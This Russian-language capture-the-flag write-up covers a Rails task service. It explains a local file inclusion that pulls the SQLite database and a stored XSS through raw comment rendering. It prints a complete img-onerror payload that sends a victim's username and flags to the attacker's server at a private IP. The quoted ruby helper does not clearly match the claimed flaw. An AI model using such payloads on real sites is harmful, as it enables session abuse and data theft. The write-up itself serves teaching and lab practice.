# 1. LFI в обработчике аватара

## Описание:

> Уязвимость позволяет злоумышленнику читать локальные файлы на сервере путём передачи неподконтрольных данных в функции, отвечающие за показывание аватаров. Хелпер avatar_url_for генерирует ссылку на аватар пользователя вида /show_avatar?file=<имя_файла>. Никакой валидации не происходит, и в параметр file можно подставить любой путь и читать любой файл в системе.
> 
> Это позволяет злоумышленнику извлечь `/rails/storage/production.sqlite3` — SQLite-базу приложения, содержащую все данные, включая флаги в таблице reward.

Уязвимость находится в файле `app/helpers/application_helper.rb` в методе `avatar_url_for`:
```ruby
def avatar_url_for(user, path = nil)
    path ||= avatar_disk_path_for(user)
    return unless path

    filename = File.basename(path)
    "/show_avatar?file=#{CGI.escape(filename)}"
  end
```

## Суть проблемы:
- путь строится на основе данных пользователя, без фильтрации;
- нет проверки, что итоговый путь остаётся внутри uploads.

## Итог:
- Без авторизации можно было просто отправить запрос на `http://IP_HOST:3000/show_avatar?file=/rails/storage/production.sqlite3`, и вытащить все флаги из полученной базы данных 

[Эксплойт для LFI (lfi.py)](./lfi.py)

# 2. XSS в комментариях

## Описание:

> XSS позволяет внедрять и выполнять произвольный JavaScript в браузере жертвы, используя некорректную обработку пользовательского ввода. В шаблоне комментария `app/views/tasks/_comment.html.haml` содержимое поля `comment.body` рендерится **сырым** без какой-либо санитизации и обработки.

```haml
.comment
  = avatar_tag_for(comment.user, size: :small)
  %div
    .comment__meta
      %span= comment.user.nickname
      - if user_signed_in? && (current_user == comment.user || current_user == task.user)
        .comment__actions
          = link_to "Удалить", task_comment_path(task, comment), data: { turbo_method: :delete, turbo_confirm: "Удалить сообщение?", turbo_confirm_style: "modal" }, class: "btn btn--ghost btn--sm", method: :delete
    .comment__text= raw(comment.body)
```

## Эксплуатация

- Можно отправить комментарий с XSS-нагрузкой и совешать любые действия от лица пользователя, прочитавшего этот комментарий.
- Любой авторизованный пользователь, открывающий страницу задачи с таким комментарием, выполнит этот JavaScript в своём браузере, что даёт возможность получать содержимое страниц от лица этого пользователя, в том числе содержимое страниц заданий, созданных им, а следовательно и значение флага на странице созданного им задания и отправить это содержимое себе.

Предлагаемый коментарий для эксплуатации:
```html
<img src='x' onerror='fetch("/profile").then(function(t){return t.text()}).then(function(t){let e=new DOMParser().parseFromString(t,"text/html"),r=e.querySelector(".profile-username");return r?r.textContent.trim():""}).then(function(t){if(t)return fetch("/").then(function(t){return t.text()}).then(function(e){let r=new DOMParser().parseFromString(e,"text/html"),n=Array.from(r.querySelectorAll(".task-card")),u=n.filter(function(e){let r=e.querySelector(".task-card__meta img"),n=(r&&(r.getAttribute("title")||r.getAttribute("alt")||"")).trim();return n===t}).map(function(t){let e=t.querySelector(".task-card__title a");return e?e.getAttribute("href"):null}).filter(Boolean);return Promise.all(u.map(function(t){return fetch(t).then(function(t){return t.text()}).then(function(t){let e=new DOMParser().parseFromString(t,"text/html"),r=e.querySelector(".reward-panel__text");return r?r.textContent.trim():null})}))}).then(function(e){let r=e.filter(Boolean);fetch("http://10.14.0.3:55555/?flag="+encodeURIComponent(JSON.stringify({user:t,rewards:r})))})});'>
```

Раскроем JS и разберем:
```javascript
fetch("/profile")
    .then(function (t) {
        return t.text();
    })
    .then(function (t) {
        let e = new DOMParser().parseFromString(t, "text/html"),
            r = e.querySelector(".profile-username");
        return r ? r.textContent.trim() : "";
    })
    .then(function (t) {
        if (t)
            return fetch("/")
                .then(function (t) {
                    return t.text();
                })
                .then(function (e) {
                    let r = new DOMParser().parseFromString(e, "text/html"),
                        n = Array.from(r.querySelectorAll(".task-card")),
                        u = n
                            .filter(function (e) {
                                let r = e.querySelector(".task-card__meta img"),
                                    n = (r && (r.getAttribute("title") || r.getAttribute("alt") || "")).trim();
                                return n === t;
                            })
                            .map(function (t) {
                                let e = t.querySelector(".task-card__title a");
                                return e ? e.getAttribute("href") : null;
                            })
                            .filter(Boolean);
                    return Promise.all(
                        u.map(function (t) {
                            return fetch(t)
                                .then(function (t) {
                                    return t.text();
                                })
                                .then(function (t) {
                                    let e = new DOMParser().parseFromString(t, "text/html"),
                                        r = e.querySelector(".reward-panel__text");
                                    return r ? r.textContent.trim() : null;
                                });
                        })
                    );
                })
                .then(function (e) {
                    let r = e.filter(Boolean);
                    fetch("http://10.0.0.2:55555/?flag=" + encodeURIComponent(JSON.stringify({ user: t, rewards: r })));
                });
    });
```

## Пояснения

Комментарий:
```html
<img src='x' onerror='...JS-код...'>
```
- `src='x'` — заведомо битая картинка => возникает ошибка загрузки.
- `onerror='...'` — при ошибке браузер выполняет указанный JavaScript в контексте страницы, от лица залогиненного пользователя (с его cookies, правами и т.д.).

В итоге наша XSS нагрузка:
- Выполняется при открытии страницы задачи (через img onerror).
- Тихо ходит по /profile и /, чтобы:
    - определить ник жертвы,
    - найти задачи, созданные именно этим пользователем.
- Открывает каждую такую задачу, вытаскивает текст награды/флага.
- Отправляет собранные флаги и имя пользователя на внешний сервер атакующего. (в данном примере `http://10.0.0.2:55555/?flag=`)

[Эксплойт для XSS (xss.py)](./xss.py)

# 3. PPC — Professional Programming & Coding (автоматизация/кодинг)

## Описание:

> Финальный вариант получить флаг - написать скрипт автоматизации, который автоматически решает лабиринт и получает награду. 
> 
> Скрипт сам регистрируется, логинится, находит все лабиринт-задачи, парсит их, решает автоматически через алгоритм BFS, забирает флаги с задач и выводит их.

[Скрипт автоматизации (ppc.py)](./ppc.py)
